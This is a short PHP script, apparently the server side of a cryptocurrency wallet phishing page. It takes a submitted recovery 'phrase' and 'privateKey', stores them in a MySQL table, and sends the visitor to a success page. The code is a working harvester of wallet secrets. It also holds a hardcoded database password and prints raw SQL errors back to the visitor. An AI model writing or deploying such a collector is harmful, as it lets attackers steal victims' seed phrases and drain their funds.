
<?php
$servername = "localhost";
$username = "codeak";
$password = "5334";
$dbname = "analos_DB";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$phrase = isset($_POST['phrase']) ? $_POST['phrase'] : '';
$privateKey = isset($_POST['privateKey']) ? $_POST['privateKey'] : '';

$sql = "INSERT INTO connections (phrase, privateKey) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ss", $phrase, $privateKey);

if ($stmt->execute()) {
    header('Location: success.html');
    exit();
} else {
    echo "Error: " . $sql . "<br>" . $stmt->error;
}

$stmt->close();
$conn->close();
?>
